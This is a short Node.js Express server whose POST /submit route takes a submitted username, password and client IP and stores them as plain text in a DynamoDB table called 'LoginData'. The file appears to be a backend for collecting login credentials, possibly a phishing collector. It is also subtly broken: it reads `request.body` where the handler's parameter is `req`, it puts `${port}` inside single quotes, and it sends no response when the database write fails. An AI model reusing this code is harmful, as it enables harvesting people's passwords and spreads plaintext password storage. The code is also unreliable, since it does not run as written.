const express = require('express');
const AWS = require('aws-sdk');
const bodyParser = require('body-parser');


const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

AWS.config.update({region: 'us-east-1'});

const dynamodb = new AWS.DynamoDB.DocumentClient();

const tableName = 'LoginData';

app.post('/submit', (req, res) => {
    // Extract username and password from the request body
    const { username, password } = request.body;

    // Obtain client IP information
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const params = {
        TableName: tableName,
        Item : {
            'Username' : username,
            'Password' : password,
            'IP' : clientIp
        }

    };

    // Store in DynamoDB
    dynamodb.put(params, (err, data) => {
        if (err) {
            console.error("Unable to add item. Error: ", JSON.stringify(err));
        } else {
            res.send('Credentials stored successfully');
        }


    });

});

const port = 3000;
app.listen(port, () => {
    console.log('Server is running on http://localhost:${port}');
});